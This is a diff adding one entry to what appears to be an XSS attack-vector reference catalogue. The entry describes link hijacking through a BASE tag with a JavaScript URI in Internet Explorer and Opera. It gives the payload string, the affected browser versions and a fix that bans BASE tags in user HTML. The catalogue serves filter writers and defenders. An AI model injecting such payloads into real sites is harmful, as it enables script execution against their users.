@@ -1268,5 +1268,35 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'css', 'background', 'opera', 'onerror'],
         'reporter'   : 'LeverOne, .mario'
+    },
+    { /* ID 42 - Link hijacking via <BASE> and JavaScript URI  */
+        'id'         : 42,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Link hijacking via <BASE> and JavaScript URI',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<base href="javascript://"><a href="/hello/,%js_alert%//#">XXX</a>',
+        'description': {
+            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer and Opera (O8-10.5 in case the link URL starts with #). User interaction is required to execute the JavaScript.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : 'User submitted HTML should not allow usage of <BASE> tags. In case they are necessary no non-HTTP/non-relative URL schemes should be allowed.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'opera': ['8.x', '9.x', '10.x'],
+            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'internet explorer', 'base', 'hijacking'],
+        'reporter'   : 'LeverOne, .mario'
     }
 ]
